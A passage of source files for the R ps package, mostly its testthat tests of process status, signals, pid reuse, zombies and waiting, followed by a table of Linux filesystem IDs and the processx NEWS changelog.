  names <- not_null(lapply(res, function(p) fallback(ps_name(p), NULL)))
  res <- res[names %in% c("px", "px.exe")]
  expect_equal(length(res), N)
})
````

### `pscheck/ps/tests/testthat/test-linux.R`

````r
if (!ps_os_type()[["LINUX"]]) {
  return()
}

test_that("status", {
  ## Argument check
  expect_error(ps_status(123), class = "invalid_argument")

  p1 <- processx::process$new("sleep", "10")
  on.exit(p1$kill(), add = TRUE)
  ps <- ps_handle(p1$get_pid())
  expect_true(ps_is_running(ps))

  wait_for_status(ps, "sleeping")
  expect_equal(ps_status(ps), "sleeping")
  ps_suspend(ps)
  wait_for_status(ps, "stopped")
  expect_equal(ps_status(ps), "stopped")
  ps_resume(ps)
  wait_for_status(ps, "sleeping")
  expect_equal(ps_status(ps), "sleeping")
  ## TODO: rest?
})

## TODO: cpu_times ??? We apparently cannot get them from ps

## Helper: read starttime (ticks since boot) from /proc/<pid>/stat,
## handling process names that contain spaces or parentheses.
proc_starttime_ticks <- function(pid) {
  raw <- readLines(sprintf("/proc/%d/stat", pid))
  ## Everything after the last ')' is the fixed-format tail
  after_paren <- sub("^.*\\) ", "", raw)
  fields <- strsplit(after_paren, " ")[[1]]
  ## starttime is the 20th field after the name (field 22 overall)
  as.numeric(fields[20])
}

## Helper: integer boot time from /proc/stat btime (what old ps used)
proc_stat_btime <- function() {
  line <- grep("^btime ", readLines("/proc/stat"), value = TRUE)
  as.numeric(strsplit(line, " +")[[1]][2])
}

test_that("ps_handle validates legacy (integer /proc/stat btime) create_time", {
  skip_if_no_processx()

  p <- processx::process$new("sleep", "100")
  on.exit(p$kill(), add = TRUE)
  pid <- p$get_pid()

  ## Build the create_time the way old ps did: integer boot time + ticks/CLK_TCK
  btime   <- proc_stat_btime()
  ticks   <- proc_starttime_ticks(pid)
  clk_tck <- as.integer(system2("getconf", "CLK_TCK", stdout = TRUE))
  legacy_ct <- structure(
    btime + ticks / clk_tck,
    class = c("POSIXct", "POSIXt"),
    tzone = "GMT"
  )

  h <- ps_handle(pid, legacy_ct)
  expect_true(ps_is_running(h))
  expect_equal(ps_name(h), "sleep")
  ps_suspend(h)
  wait_for_status(h, "stopped")
  expect_equal(ps_status(h), "stopped")
  ps_resume(h)
  wait_for_status(h, "sleeping")
  expect_equal(ps_status(h), "sleeping")
})

test_that("ps_handle validates precise (CLOCK_REALTIME-CLOCK_MONOTONIC) create_time", {
  skip_if_no_processx()

  p <- processx::process$new("sleep", "100")
  on.exit(p$kill(), add = TRUE)
  pid <- p$get_pid()

  ## ps_handle(pid) auto-discovers the precise create_time internally
  precise_ct <- ps_create_time(ps_handle(pid))

  ## Re-create the handle with that explicit precise time
  h <- ps_handle(pid, precise_ct)
  expect_true(ps_is_running(h))
  expect_equal(ps_name(h), "sleep")
  ps_suspend(h)
  wait_for_status(h, "stopped")
  expect_equal(ps_status(h), "stopped")
  ps_resume(h)
  wait_for_status(h, "sleeping")
  expect_equal(ps_status(h), "sleeping")
})

test_that("memory_info", {
  ## Argument check
  expect_error(ps_memory_info(123), class = "invalid_argument")

  skip_on_cran()

  p1 <- processx::process$new("ls", c("-lR", "/"))
  on.exit(p1$kill(), add = TRUE)
  ps <- ps_handle(p1$get_pid())

  Sys.sleep(0.2)
  ps_suspend(ps)
  mem <- ps_memory_info(ps)
  mem2 <- scan(
    sprintf("/proc/%d/statm", ps_pid(ps)),
    what = integer(),
    quiet = TRUE
  )
  page_size <- as.integer(system2("getconf", "PAGESIZE", stdout = TRUE))

  expect_equal(mem[["vms"]], mem2[[1]] * page_size)
  expect_equal(mem[["rss"]], mem2[[2]] * page_size)
})
````

### `pscheck/ps/tests/testthat/test-macos.R`

````r
if (!ps_os_type()[["MACOS"]]) {
  return()
}

test_that("status", {
  ## Argument check
  skip_on_cran()
  expect_error(ps_status(123), class = "invalid_argument")

  p1 <- processx::process$new("sleep", "10")
  on.exit(cleanup_process(p1), add = TRUE)
  ps <- ps_handle(p1$get_pid())
  expect_true(ps_is_running(ps))

  expect_equal(ps_status(), "running")
  expect_equal(ps_status(ps), "sleeping")
  ps_suspend(ps)
  expect_equal(ps_status(ps), "stopped")
  ps_resume(ps)
  expect_equal(ps_status(ps), "sleeping")
  ## TODO: can't easily test 'idle'
})

test_that("cpu_times", {
  skip_on_cran()

  ## Argument check
  expect_error(ps_cpu_times(123), class = "invalid_argument")

  p1 <- processx::process$new("ls", c("-lR", "/"))
  on.exit(cleanup_process(p1), add = TRUE)
  ps <- ps_handle(p1$get_pid())

  Sys.sleep(0.2)
  ps_suspend(ps)
  ct <- ps_cpu_times(ps)
  ps2_user <- parse_time(parse_ps(c("-o", "utime", "-p", ps_pid(ps))))
  ps2_total <- parse_time(parse_ps(c("-o", "time", "-p", ps_pid(ps))))

  expect_true(abs(round(ct[["user"]], 2) - ps2_user) < 0.2)
  expect_true(abs(round(ct[["system"]], 2) - (ps2_total - ps2_user)) < 0.2)
})

test_that("memory_info", {
  skip_on_cran()

  ## Argument check
  expect_error(ps_memory_info(123), class = "invalid_argument")

  p1 <- processx::process$new("ls", c("-lR", "/"))
  on.exit(cleanup_process(p1), add = TRUE)
  ps <- ps_handle(p1$get_pid())

  Sys.sleep(0.2)
  ps_suspend(ps)
  mem <- ps_memory_info(ps)
  ps2_rss <- as.numeric(parse_ps(c("-o", "rss", "-p", ps_pid(ps))))
  ps2_vms <- as.numeric(parse_ps(c("-o", "vsize", "-p", ps_pid(ps))))

  expect_equal(mem[["rss"]] / 1024, ps2_rss, tolerance = 10)
  expect_equal(mem[["vms"]] / 1024, ps2_vms, tolerance = 10)
})
````

### `pscheck/ps/tests/testthat/test-pid-reuse.R`

````r
test_that("pid reuse", {
  ## This is simulated, because it is quite some work to force a pid
  ## reuse on some systems. So we create a handle with the pid of a
  ## running process, but wrong (earlier) create time stamp.

  z <- processx::process$new(px(), c("sleep", "600"))
  on.exit(z$kill(), add = TRUE)
  zpid <- z$get_pid()

  ctime <- Sys.time() - 60
  attr(ctime, "tzone") <- "GMT"
  p <- ps_handle(zpid, ctime)

  expect_match(format(p), format_regexp())
  expect_output(print(p), format_regexp())

  expect_equal(ps_pid(p), zpid)
  expect_equal(ps_create_time(p), ctime)
  expect_false(ps_is_running(p))

  chk <- function(expr) {
    err <- tryCatch(expr, error = function(e) e)
    expect_s3_class(err, "no_such_process")
    expect_s3_class(err, "ps_error")
    expect_equal(err$pid, zpid)
  }

  ## All these error out with "no_such_process"
  chk(ps_status(p))
  chk(ps_ppid(p))
  chk(ps_parent(p))
  chk(ps_name(p))
  if (ps_os_type()[["POSIX"]]) {
    chk(ps_uids(p))
  }
  chk(ps_username(p))
  if (ps_os_type()[["POSIX"]]) {
    chk(ps_gids(p))
  }
  chk(ps_terminal(p))

  if (ps_os_type()[["POSIX"]]) {
    chk(ps_send_signal(p, signals()$SIGINT))
  }
  chk(ps_suspend(p))
  chk(ps_resume(p))
  if (ps_os_type()[["POSIX"]]) {
    chk(ps_terminate(p))
  }

  # kill will be still OK, the original process is already dead
  expect_equal(ps_kill(p), "dead")

  chk(ps_exe(p))
  chk(ps_cmdline(p))
  chk(ps_environ(p))
  chk(ps_cwd(p))
  chk(ps_memory_info(p))
  chk(ps_cpu_times(p))
  chk(ps_num_threads(p))
  chk(ps_num_fds(p))
  chk(ps_open_files(p))
  chk(ps_connections(p))
})
````

### `pscheck/ps/tests/testthat/test-posix-zombie.R`

````r
if (!ps_os_type()[["POSIX"]]) {
  return()
}

test_that("zombie api", {
  zpid <- zombie()
  on.exit(waitpid(zpid), add = TRUE)
  p <- ps_handle(zpid)
  me <- ps_handle()

  expect_match(format(p), format_regexp())
  expect_output(print(p), format_regexp())

  expect_equal(ps_pid(p), zpid)
  expect_true(ps_create_time(p) > ps_create_time(me))
  expect_true(ps_is_running(p))
  expect_equal(ps_status(p), "zombie")
  expect_equal(ps_ppid(p), Sys.getpid())
  expect_equal(ps_pid(ps_parent(p)), Sys.getpid())
  expect_equal(ps_name(p), ps_name(me))
  expect_identical(ps_uids(p), ps_uids(me))
  expect_identical(ps_username(p), ps_username(me))
  expect_identical(ps_gids(p), ps_gids(me))
  expect_identical(ps_terminal(p), ps_terminal(me))
  expect_silent(ps_children(p))

  ## You can still send signals if you like
  expect_silent(ps_send_signal(p, signals()$SIGINT))
  expect_equal(ps_status(p), "zombie")
  expect_silent(ps_suspend(p))
  expect_equal(ps_status(p), "zombie")
  expect_silent(ps_resume(p))
  expect_equal(ps_status(p), "zombie")
  expect_silent(ps_terminate(p))
  expect_equal(ps_status(p), "zombie")
  expect_silent(ps_kill(p))
  expect_equal(ps_status(p), "zombie")

  chk <- function(expr) {
    err <- tryCatch(expr, error = function(e) e)
    expect_s3_class(err, "zombie_process")
    expect_s3_class(err, "ps_error")
    expect_equal(err$pid, zpid)
  }

  ## These raise zombie_process errors
  chk(ps_exe(p))
  chk(ps_cmdline(p))
  chk(ps_environ(p))
  chk(ps_cwd(p))
  chk(ps_memory_info(p))
  chk(ps_cpu_times(p))
  chk(ps_num_threads(p))
  chk(ps_num_fds(p))
  chk(ps_open_files(p))
  chk(ps_connections(p))
  chk(ps_get_nice(p))
  chk(ps_set_nice(p, 20L))
  if (ps_os_type()[["MACOS"]]) {
    chk(.Call(psll_memory_uss, p))
  } else if (ps_os_type()[["LINUX"]]) {
    chk(.Call(ps__memory_maps, p))
  }
})
````

### `pscheck/ps/tests/testthat/test-posix.R`

````r
if (!ps_os_type()[["POSIX"]]) {
  return()
}

test_that("is_running", {
  ## Zombie is running
  zpid <- zombie()
  on.exit(waitpid(zpid), add = TRUE)
  ps <- ps_handle(zpid)
  expect_true(ps_is_running(ps))
})

test_that("terminal", {
  tty <- ps_terminal(ps_handle())
  if (is.na(tty)) {
    skip("no terminal")
  }
  expect_true(file.exists(tty))

  ## It is a character special file
  out <- processx::run("ls", c("-l", tty))$stdout
  expect_equal(substr(out, 1, 1), "c")
})

test_that("username, uids, gids", {
  if (Sys.which("ps") == "") {
    skip("No ps program")
  }
  ret <- system("ps -p 1 >/dev/null 2>/dev/null")
  if (ret != 0) {
    skip("ps does not work properly")
  }
  p1 <- processx::process$new("sleep", "10")
  on.exit(p1$kill(), add = TRUE)
  ps <- ps_handle(p1$get_pid())
  expect_true(ps_is_running(ps))

  ps2_username <- parse_ps(c("-o", "user", "-p", ps_pid(ps)))
  expect_equal(ps_username(ps), ps2_username)

  ps2_uid <- parse_ps(c("-o", "uid", "-p", ps_pid(ps)))
  expect_equal(ps_uids(ps)[["real"]], as.numeric(ps2_uid))

  ps2_gid <- parse_ps(c("-o", "rgid", "-p", ps_pid(ps)))
  expect_equal(ps_gids(ps)[["real"]], as.numeric(ps2_gid))
})


test_that("send_signal", {
  p1 <- processx::process$new("sleep", "10")
  on.exit(p1$kill(), add = TRUE)
  ps <- ps_handle(p1$get_pid())

  ps_send_signal(ps, signals()$SIGINT)
  timeout <- Sys.time() + 60
  while (Sys.time() < timeout && p1$is_alive()) {
    Sys.sleep(0.05)
  }
  expect_false(p1$is_alive())
  expect_false(ps_is_running(ps))
  expect_equal(p1$get_exit_status(), -signals()$SIGINT)
})

test_that("terminate", {
  p1 <- processx::process$new("sleep", "10")
  on.exit(p1$kill(), add = TRUE)
  ps <- ps_handle(p1$get_pid())

  ps_terminate(ps)
  timeout <- Sys.time() + 60
  while (Sys.time() < timeout && p1$is_alive()) {
    Sys.sleep(0.05)
  }
  expect_false(p1$is_alive())
  expect_false(ps_is_running(ps))
  expect_equal(p1$get_exit_status(), -signals()$SIGTERM)
})

test_that("kill with grace", {
  p1 <- processx::process$new(
    px(),
    c("sigterm", "ignore", "outln", "setup", "sleep", "3"),
    stdout = "|"
  )
  on.exit(p1$kill(), add = TRUE)
  ph1 <- p1$as_ps_handle()

  # need to wait until the SIGTERM handler is set up in px
  expect_equal(p1$poll_io(1000)[["output"]], "ready")
  expect_equal(ps_kill(ph1), "killed")
})

test_that("kill with grace, multiple processes", {
  # ignored SIGTERM completely
  p1 <- processx::process$new(
    px(),
    c("sigterm", "ignore", "outln", "setup", "sleep", "3"),
    stdout = "|"
  )
  on.exit(p1$kill(), add = TRUE)
  ph1 <- p1$as_ps_handle()

  # exits 0.5s later after SIGTERM
  p2 <- processx::process$new(
    px(),
    c("sigterm", "sleep", "0.5", "outln", "setup", "sleep", "3"),
    stdout = "|"
  )
  on.exit(p2$kill(), add = TRUE)
  ph2 <- p2$as_ps_handle()

  # exits on SIGTERM
  p3 <- processx::process$new(px(), c("sleep", "3"))
  on.exit(p3$kill(), add = TRUE)
  ph3 <- p3$as_ps_handle()

  # wait until signal handlers are set up
  expect_equal(p1$poll_io(1000)[["output"]], "ready")
  expect_equal(p2$poll_io(1000)[["output"]], "ready")
  expect_equal(
    ps_kill(list(ph1, ph2, ph3), grace = 1000),
    c("killed", "terminated", "terminated")
  )
})
````

### `pscheck/ps/tests/testthat/test-ps.R`

````r
test_that("issue #129", {
  if (!ps_os_type()[["POSIX"]]) {
    return()
  }
  pss <- ps(user = "root", after = as.POSIXct('2022-05-15', tz = "GMT"))
  expect_s3_class(pss, "tbl")
})

test_that("can select columns", {
  skip_on_cran()
  expect_silent(ps(user = ps_username(), columns = c("pid", "username")))
  expect_silent(ps(user = ps_username(), columns = "*"))
})
````

### `pscheck/ps/tests/testthat/test-system.R`

````r
test_that("ps_pids", {
  pp <- ps_pids()
  expect_true(is.integer(pp))
  expect_true(Sys.getpid() %in% pp)
})

test_that("ps", {
  pp <- ps()
  expect_true(inherits(pp, "tbl"))
  expect_true(Sys.getpid() %in% pp$pid)

  px <- processx::process$new(px(), c("sleep", "5"))
  x <- ps_handle(px$get_pid())
  on.exit(px$kill(), add = TRUE)
  pp <- ps(after = Sys.time() - 60 * 60)
  ct <- lapply(pp$pid, function(p) {
    tryCatch(ps_create_time(ps_handle(p)), error = function(e) NULL)
  })
  ct <- not_null(ct)
  expect_true(all(map_lgl(ct, function(x) x > Sys.time() - 60 * 60)))

  pp <- ps(user = ps_username(ps_handle()))
  expect_true(all(pp$username == ps_username(ps_handle())))
})

test_that("ps_boot_time", {
  bt <- ps_boot_time()
  expect_s3_class(bt, "POSIXct")
  expect_true(bt < Sys.time())
})

test_that("ps_os_type", {
  os <- ps_os_type()
  expect_true(is.logical(os))
  expect_true(any(os))
  expect_equal(
    names(os),
    c("POSIX", "WINDOWS", "LINUX", "MACOS")
  )
})

test_that("ps_is_supported", {
  expect_equal(any(ps_os_type()), ps_is_supported())
})

test_that("supported_str", {
  expect_equal(supported_str(), "Windows, Linux, Macos")
})

test_that("ps_os_name", {
  expect_true(ps_os_name() %in% names(ps_os_type()))
})

test_that("ps_users runs", {
  expect_error(ps_users(), NA)
})

test_that("ps_cpu_count", {
  log <- ps_cpu_count(logical = TRUE)
  phy <- ps_cpu_count(logical = FALSE)
  if (!is.na(log) && !is.na(phy)) {
    expect_true(log >= phy)
  }
  if (!is.na(log)) {
    expect_true(log > 0)
  }
  if (!is.na(phy)) expect_true(phy > 0)
})
````

### `pscheck/ps/tests/testthat/test-utils.R`

````r
test_that("errno", {
  err <- errno()
  expect_true(is.data.frame(err))

  expect_true("EINVAL" %in% err$name)
  expect_true("EBADF" %in% err$name)
})

test_that("str_strip", {
  tcs <- list(
    list("", ""),
    list(" ", ""),
    list("a ", "a"),
    list(" a", "a"),
    list(" a ", "a"),
    list("    a       ", "a"),
    list(character(), character()),
    list(c("", NA, "a "), c("", NA, "a")),
    list("\ta\n", "a")
  )

  for (tc in tcs) {
    expect_identical(str_strip(tc[[1]]), tc[[2]])
  }
})

test_that("NA_time", {
  nat <- NA_time()
  expect_s3_class(nat, "POSIXct")
  expect_true(length(nat) == 1 && is.na(nat))
})

test_that("read_lines", {
  tmp <- tempfile()
  cat("foo\nbar\nfoobar", file = tmp)
  expect_silent(l <- read_lines(tmp))
  expect_equal(l, c("foo", "bar", "foobar"))
})
````

### `pscheck/ps/tests/testthat/test-wait-inotify.R`

````r
test_that("dummy", {
  expect_true(TRUE)
})

if (ps_os_type()[["LINUX"]]) {
  fun <- function() {
    withr::local_envvar(PS_WAIT_FORCE_INOTIFY = "true")
    testthat::source_file(test_path("test-wait.R"), env = environment())
  }
  fun()
}
````

### `pscheck/ps/tests/testthat/test-wait.R`

````r
test_that("single process", {
  skip_on_cran()
  p <- processx::process$new(px(), c("sleep", "600"))
  on.exit(p$kill(), add = TRUE)
  ph <- ps_handle(p$get_pid())

  expect_false(ps_wait(ph, 0))
  expect_false(ps_wait(list(ph), 0))

  tic <- Sys.time()
  expect_false(ps_wait(ph, 100))
  toc <- Sys.time()
  expect_true(toc - tic >= as.difftime(0.1, units = "secs"))

  p$kill()
  tic <- Sys.time()
  expect_true(ps_wait(ph, 1000))
  toc <- Sys.time()
  expect_true(toc - tic < as.difftime(1, units = "secs"))
})

test_that("multiple processes", {
  skip_on_cran()
  p1 <- processx::process$new(px(), c("sleep", "600"))
  on.exit(p1$kill(), add = TRUE)
  ph1 <- ps_handle(p1$get_pid())
  p2 <- processx::process$new(px(), c("sleep", "600"))
  on.exit(p2$kill(), add = TRUE)
  ph2 <- ps_handle(p2$get_pid())
  p3 <- processx::process$new(px(), c("sleep", "600"))
  on.exit(p3$kill(), add = TRUE)
  ph3 <- ps_handle(p3$get_pid())

  expect_equal(ps_wait(list(ph1, ph2, ph3), 0), c(FALSE, FALSE, FALSE))
  expect_equal(ps_wait(list(ph1, ph2, ph3), 100), c(FALSE, FALSE, FALSE))

  p1$kill()
  p2$kill()
  p3$kill()
  tic <- Sys.time()
  expect_equal(ps_wait(list(ph1, ph2, ph3), 1000), c(TRUE, TRUE, TRUE))
  toc <- Sys.time()
  expect_true(toc - tic < as.difftime(1, units = "secs"))
})

test_that("stress test", {
  skip_on_cran()
  pp <- lapply(1:100, function(i) {
    processx::process$new(px(), c("sleep", "2"))
  })
  on.exit(lapply(pp, function(p) p$kill()), add = TRUE)
  pps <- lapply(pp, function(p) ps_handle(p$get_pid()))

  tic <- Sys.time()
  ret <- ps_wait(pps, 0)
  toc <- Sys.time()
  expect_equal(ret, rep(FALSE, length(pp)))
  expect_true(toc - tic < as.difftime(0.5, units = "secs"))

  tic <- Sys.time()
  ret <- ps_wait(pps, 3000)
  toc <- Sys.time()
  expect_equal(ret, rep(TRUE, length(pp)))
  expect_true(toc - tic < as.difftime(3, units = "secs"))
})
````

### `pscheck/ps/tests/testthat/test-windows.R`

````r
if (!ps_os_type()[["WINDOWS"]]) {
  return()
}

test_that("uids, gids", {
  p1 <- processx::process$new(px(), c("sleep", "10"))
  on.exit(p1$kill(), add = TRUE)
  ps <- ps_handle(p1$get_pid())
  expect_true(ps_is_running(ps))

  err <- tryCatch(ps_uids(ps), error = function(e) e)
  expect_s3_class(err, "not_implemented")
  expect_s3_class(err, "ps_error")
  err <- tryCatch(ps_gids(ps), error = function(e) e)
  expect_s3_class(err, "not_implemented")
  expect_s3_class(err, "ps_error")
})

test_that("terminal", {
  p1 <- processx::process$new(px(), c("sleep", "10"))
  on.exit(p1$kill(), add = TRUE)
  ps <- ps_handle(p1$get_pid())
  expect_true(ps_is_running(ps))

  expect_identical(ps_terminal(ps), NA_character_)
})

## TODO: username
## TODO: cpu_times
## TODO: memory_info

test_that("total and available mem", {
  l <- .Call(ps__system_memory)[c("total", "avail")]
  expect_true(is.numeric(l$total))
  expect_true(is.numeric(l$avail))
  expect_lte(l$avail, l$total)
})
````

### `pscheck/ps/tests/testthat/test-winver.R`

````r
test_that("winver_ver", {
  cases <- list(
    list(c("", "Microsoft Windows [Version 6.3.9600]"), "6.3.9600"),
    list("Microsoft Windows [version 6.1.7601]", "6.1.7601"),
    list("Microsoft Windows [vers\u00e3o 10.0.18362.207]", "10.0.18362.207")
  )

  source(system.file("tools", "winver.R", package = "ps"), local = TRUE)

  for (x in cases) {
    expect_identical(winver_ver(x[[1]]), x[[2]])
  }
})

test_that("winver_wmic", {
  cases <- list(
    list(c("\r", "\r", "Version=6.3.9600\r", "\r", "\r", "\r"), "6.3.9600"),
    list(c("\r", "\r", "version=6.3.9600\r", "\r", "\r", "\r"), "6.3.9600"),
    list(c("\r", "\r", "vers\u00e3o=6.3.9600\r", "\r", "\r", "\r"), "6.3.9600")
  )

  source(system.file("tools", "winver.R", package = "ps"), local = TRUE)

  for (x in cases) {
    expect_identical(winver_wmic(x[[1]]), x[[2]])
  }
})
````

### `pscheck/ps/tests/testthat/test-z-string.R`

````r
# Named 'test-z-string' so it will run last.
# Testing for errors that crop up due to differences
# in start (load/attach) time for `ps`.

test_that("string", {
  ps <- ps_handle()

  # Values satisfy encoding assumptions
  expect_true(all(ps_pids() < 52 * 62^3))
  expect_lt(Sys.time(), (62^8 / 1000) * 0.99)

  # Roundtrip through ps_string
  str <- expect_silent(ps_string(ps))
  ps2 <- expect_silent(ps_handle(str))

  # Got the same process back
  expect_true(ps_is_running(ps2))
  expect_identical(ps_pid(ps), ps_pid(ps2))
  expect_identical(ps_ppid(ps), ps_ppid(ps2))

  # Invalid process
  ps2 <- expect_silent(ps_handle(ps_pid(ps), ps_create_time(ps) + 1))
  expect_false(ps_is_running(ps2))
  str <- expect_silent(ps_string(ps2))
  ps2 <- expect_silent(ps_handle(str))
  expect_false(ps_is_running(ps2))

})


test_that("ipc string", {

  skip_on_cran()
  skip_on_covr()

  expect_true(
    callr::r(
      function(str) {
        ps <- ps::ps_handle(str)
        ps::ps_is_running(ps)
      },
      args = list(str = ps_string())
    )
  )

})
````

### `pscheck/ps/tools/linux-fs-types.txt`

````text
name id
adfs 44533
affs 44543
afs 1397113167
anon_inode_fs 151263540
autofs 391
bdevfs 1650746742
befs 1111905073
bfs 464386766
binfmtfs 1112100429
bpf_fs 3405662737
btrfs 2435016766
btrfs_test 1936880249
cgroup 2613483
cgroup2 1667723888
cifs_number 4283649346
coda 1937076805
coh 19920823
cramfs 684539205
debugfs 1684170528
devfs 4979
devpts 7377
ecryptfs 61791
efivarfs 3730735588
efs 4278867
ext 4989
ext2_old 61265
ext2 61267
ext3 61267
ext4 61267
f2fs 4076150800
fuse 1702057286
futexfs 195894762
hfs 16964
hostfs 12648430
hpfs 4187351113
hugetlbfs 2508478710
isofs 38496
jffs2 29366
jfs 827541066
minix 4991
minix2 5007
minix2 9320
minix22 9336
minix3 19802
mqueue 427819522
msdos 19780
mtd_inode_fs 288389204
ncp 22092
nfs 26985
nilfs 13364
nsfs 1853056627
ntfs_sb 1397118030
ocfs2 1952539503
openprom 40865
overlayfs 2035054128
pipefs 1346981957
proc 40864
pstorefs 1634035564
qnx4 47
qnx6 1746473250
ramfs 2240043254
reiserfs 1382369651
romfs 29301
securityfs 1935894131
selinux 4185718668
smack 1128357203
smb 20859
smb2_number 4266872130
sockfs 1397703499
squashfs 1936814952
sysfs 1650812274
sysv2 19920822
sysv4 19920821
tmpfs 16914836
tracefs 1953653091
udf 352400198
ufs 72020
usbdevice 40866
v9fs 16914839
vxfs 2768370933
xenfs 2881100148
xenix 19920820
xfs 1481003842
_xiafs 19911021
````

### `px390/processx/NEWS.md`

````text
# processx 3.9.0

* New experimental `pipeline` R6 class for running two or more processes
  connected by kernel-level pipes, like a Unix shell pipeline
  (`cmd1 | cmd2 | cmd3`). Data flows directly between child processes
  without passing through R. Works on Unix and Windows (#280).

* New "Process cleanup" article.

* New `linux_pdeathsig` argument to `process$new()`: on Linux, the child
  process receives the specified signal when the parent R process exits.
  Set to `TRUE` for `SIGTERM`, or pass an integer signal number directly
  (e.g. `tools::SIGKILL`). Ignored on non-Linux platforms (#36).

* New `process$get_end_time()` method returns the time when the process
  exited as a `POSIXct`, or `NULL` if it is still running (#218).

* `process$new()` and `run()` now support `pty = TRUE` on Windows 10 version
  1809 and later, in addition to Unix. The Windows implementation uses the
  ConPTY API (`CreatePseudoConsole`). The API is loaded dynamically so
  processx continues to load on older Windows and emits a clear error if
  `pty = TRUE` is requested on an unsupported version (#231).

* `run()` now supports `pty = TRUE` and `pty_options` to run a process in a
  pseudo-terminal (PTY) on Unix and Windows (see above). This causes the
  child to see a real terminal, so programs that disable colour output or
  interactive behaviour when not attached to a terminal will behave as if
  they are. `stderr` is merged into `stdout` (the result's `$stderr` is
  always `NULL`). A file-based `stdin` argument is also supported: its
  contents are fed to the process via the PTY master, followed by an EOF
  signal (#230).

* `process$new()` now supports `">>"` as a prefix for `stdout` and `stderr`
  file paths (e.g. `stdout = ">>output.log"`), which appends output to the
  file instead of truncating it. The file is created if it does not exist (#403).

* `env = "current"` now works correctly as a standalone value, inheriting
  the full environment of the current process (#399).

* `run()` and `process$new()` now support `encoding = "binary"` to capture
  binary output. In this mode `run()` returns `stdout` and `stderr` as raw
  vectors, and `process$read_output()` / `process$read_error()` return raw
  vectors instead of character strings. All bytes are preserved exactly,
  including null bytes and non-UTF-8 byte sequences (#406).

* New `process$read_output_bytes()`, `process$read_error_bytes()` methods
  and `conn_read_bytes()` function for reading raw bytes from a processx
  connection directly (#406).

* On Linux, `process$get_start_time()` now returns the correct wall-clock
  start time. Previously it was systematically ~0.3–0.5 s too early because
  the boot time was read from `/proc/stat btime`, which is truncated to whole
  seconds. processx now derives the boot time from
  `CLOCK_REALTIME − CLOCK_MONOTONIC`, which has nanosecond precision. The
  ps package is updated in tandem to accept handles created by either the old
  or the new method, so new ps + old processx continues to work (#394, #402).

# processx 3.8.7

No changes.

# processx 3.8.6

* `processx::process` objects are cloneable again, temporarily,
  to avoid warning-like messages from R6 2.6.0 and later.

* processx now does not change the state of the RNG (#390).

# processx 3.8.5

* No changes.

# processx 3.8.4

* No changes.

# processx 3.8.3

* `*printf()` format strings are now safer (#379).

# processx 3.8.2

* The client library, used by callr, now ignores `SIGPIPE` when writing
  to a file descriptor, on unix. This avoid possible freezes when a
  `callr::r_session` subprocess is trying to report its result after the
  main process was terminated. In particular, this happened with parallel
  testthat: https://github.com/r-lib/testthat/issues/1819

# processx 3.8.1

* On Unixes, R processes created by callr now feature a `SIGTERM`
  cleanup handler that cleans up the temporary directory before
  shutting down. To enable it, set the `PROCESSX_R_SIGTERM_CLEANUP`
  envvar to a non-empty value.

# processx 3.8.0

* processx error stacks are better now. They have ANSI hyperlinks for
  function calls to their manual pages, and they also print operators
  better.

* processx now does not mark standard streams as close-on-exec on Unix,
  as this causes problems when calling `system()` from an R subprocess
  (https://github.com/r-lib/callr/issues/236).

# processx 3.7.0

* New functions for creating portable FIFOs and Unix socket connections.
  See `conn_create_fifo()`, `conn_create_unix_socket()` and
  `vignettes/internals.Rmd` for documentation. These functions are currently
  experimental.

# processx 3.6.1

* processx now closes file unneeded file descriptors when redirecting
  the standard output and error, in the client file.

* processx errors now do not have `rlang_error` and `rlang_trace` classes,
  because they are actually not compatible with rlang errors and traces.

# processx 3.6.0

* processx now gives better error messages, and better stack traces.

# processx 3.5.3

* `run()` now sets `stderr` to `NULL` in the result (instead of an empty
  string), if the standard error was redirected to the standard output.
  This also fixes an error when interrupting a `run()` with a redirected
  standard error.

* processx now does not fail if the current working directory contains
  a non-ASCII character on Windows, and `getwd()` returns a short path
  for it (#313).

# processx 3.5.2

* `run()` now does not truncate stdout and stderr when the output
  contains multibyte characters (#298, @infotroph).

* processx now compiles with custom compilers that enable OpenMP (#297).

* processx now avoids a race condition when the working directory is
  changed right after starting a process, potentially before the
  sub-process is initialized (#300).

* processx now works with non-ASCII path names on non-UTF-8 Unix platforms
  (#293).

# processx 3.5.1

* Fix a potential failure when polling curl file descriptors on Windows.

# processx 3.5.0

* You can now append environment variables to the ones set in the current
  process if you include `"current"` in the value of `env`, in `run()`
  and for `process$new()`: `env = c("current", NEW = "newvalue")` (#232).

* Sub-processes can now inherit the standard input, output and error from
  the main R process, by setting the corresponding argument to an empty
  string. E.g. `run("ls", stdout = "")` (#72).

* `run()` is now much faster with large standard output or standard
  error (#286).

* `run()` can now discard the standard output and error or redirect
  them to file(s), instead of collecting them.

* processx now optionally uses the cli package to color error messages
  and stack traces, instead of crayon.

# processx 3.4.5

* New options in `pty_options` to set the initial size of the pseudo
  terminal.

* Reading the standard output or error now does not crash occasionally
  when a `\n` character is at the beginning of the input buffer (#281).

# processx 3.4.4

* processx now works correctly for non-ASCII commands and arguments passed
  in the native encoding, on Windows (#261, #262, #263, #264).

* Providing multiple environment variables now works on windows (#267).

# processx 3.4.3

* The supervisor (activated with `supervise = TRUE`) does not crash
  on the Windows Subsystem on Linux (WSL) now (#222).

* Fix ABI compatibility for pre and post R 4.0.1 versions. Now CRAN
  builds (with R 4.0.2 and later 4.0.x) work well on R 4.0.0.

* Now processx can run commands on UNC paths specified with
  forward slashes: `//hostname/...` UNC paths with the usual
  back-slashes were always fine (#249).

* The `$as_ps_handle()` method works now better; previously it
  sometimes created an invalid `ps::ps_handle` object, if the system
  clock has changed (#258).

# processx 3.4.2

* `run()` now does a better job with displaying the spinner on terminals
  that buffer the output (#223).

* Error messages are now fully printed after an error. In non-interactive
  sessions, the stack trace is printed as well.

* Further improved error messages. Errors from C code now include the
  name of the C function, and errors that belong to a process include the
  system command (#197).

* processx does not crash now if the process receives a SIGPIPE signal when
  trying to write to a pipe, of which the other end has already exited.

* processx now to works better with fork clusters from the parallel
  package. See 'Mixing processx and the parallel base R package' in the
  README file (#236).

* processx now does no block SIGCHLD by default in the subprocess,
  blocking potentially causes zombie sub-subprocesses (#240).

* The `process$wait()` method now does not leak file descriptors on
  Unix when interrupted (#141).

# processx 3.4.1

* Now `run()` does not create an `ok` variable in the global environment.

# processx 3.4.0

* Processx has now better error messages, in particular, all errors from C
  code contain the file name and line number, and the system error code
  and message (where applicable).

* Processx now sets the `.Last.error` variable for every un-caught processx
  error to the error condition, and also sets `.Last.error.trace` to its
  stack trace.

* `run()` now prints the last 10 lines of the standard error stream on
  error, if `echo = FALSE`, and it also prints the exit status of the
  process.

